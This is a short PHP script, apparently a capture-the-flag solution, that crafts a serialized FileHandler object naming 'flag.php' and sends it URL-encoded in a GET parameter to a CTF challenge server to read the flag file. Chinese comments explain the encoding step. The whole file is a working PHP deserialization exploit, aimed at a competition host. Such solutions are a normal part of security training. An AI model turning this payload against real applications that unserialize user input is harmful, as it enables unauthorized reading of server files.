<?php

class FileHandler
{
    public int $op;
    public string $filename;
    public string $content;

    function __construct(int $a, string $b, string $c)
    {
        $this->op = $a;
        $this->filename = $b;
        $this->content = $c;
    }
}

$a = new FileHandler(2, "flag.php", "");

// echo serialize($a) . "\n\n";

// ============ 直接发包（GET 版，无需curl扩展）============
$url = "http://0e43eb6e84dac1875d1f02f7.http-ctf2.dasctf.com/";

// 关键：把序列化结果整体 urlencode（会正确处理 %00、引号、& 等）
$payload = urlencode(serialize($a));

$fullUrl = $url . "?str=" . $payload;

$context = stream_context_create([
    "http" => [
        "method" => "GET",
        "header" => "User-Agent: Mozilla/5.0\r\n",
        "ignore_errors" => true, // 4xx/5xx 也读取响应内容
    ],
]);

$resp = file_get_contents($fullUrl, false, $context);
echo "=== 服务器响应 ===\n" . $resp . "\n";
